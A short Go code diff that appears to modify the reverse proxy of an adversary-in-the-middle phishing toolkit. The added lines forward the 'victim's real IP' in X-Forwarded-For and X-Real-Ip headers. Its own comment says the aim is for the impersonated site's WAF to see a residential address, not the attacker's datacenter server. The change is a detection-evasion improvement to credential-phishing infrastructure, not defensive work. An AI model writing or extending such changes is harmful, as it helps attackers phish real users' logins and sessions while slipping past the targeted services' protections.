@@ -792,6 +792,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
+				// forward victim's real IP so upstream WAF sees residential IP, not VPS datacenter IP
+				if remote_addr != "" {
+					req.Header.Set("X-Forwarded-For", remote_addr)
+					req.Header.Set("X-Real-Ip", remote_addr)
+				}
+
 				// patch GET query params with original domains
 				if pl != nil {
 					qs := req.URL.Query()
